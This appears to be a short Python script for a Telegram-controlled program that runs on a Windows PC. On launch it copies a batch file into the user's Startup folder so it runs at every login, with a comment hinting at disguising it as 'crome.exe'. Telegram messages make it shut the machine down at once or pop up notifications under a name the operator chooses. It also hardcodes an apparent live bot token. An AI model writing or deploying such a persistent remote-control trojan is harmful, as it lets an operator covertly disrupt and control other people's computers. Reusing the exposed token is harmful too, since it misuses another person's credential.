from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
import plyer.platforms.win.notification
from plyer import notification
from os import remove, system, path
from getpass import getuser
from sys import argv, exit
TOKEN = "5146124361:AAGFr3KpWphIyXsYHi6wjoh4Gv3vwW3bwYY"
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)
USER_NAME = getuser()
not_name = "Внимание!"
def add_to_startup():
    global bat_path, USER_NAME, path_unlock  
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME  
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'START "" "%s"' %argv[0]) #START "" "D:\51\update\data\crome\crome.exe"
        
def change_name(name):
  global not_name
  text = name.replace('NAME ','')
  not_name = text

@dp.message_handler(content_types=['text'])
async def get_text_messages(msg: types.Message): 
    if msg.text.lower() == 'off' :
      print('Shotdown os')
      system('shutdown -s -t 0')
      
    if 'print' in msg.text.lower():
      text = msg.text.replace('Print','')
      notification.notify(not_name, text,timeout = 8)
    elif 'NAME ' in msg.text:
      change_name(msg.text)

if __name__ == '__main__':
  add_to_startup()
  executor.start_polling(dp)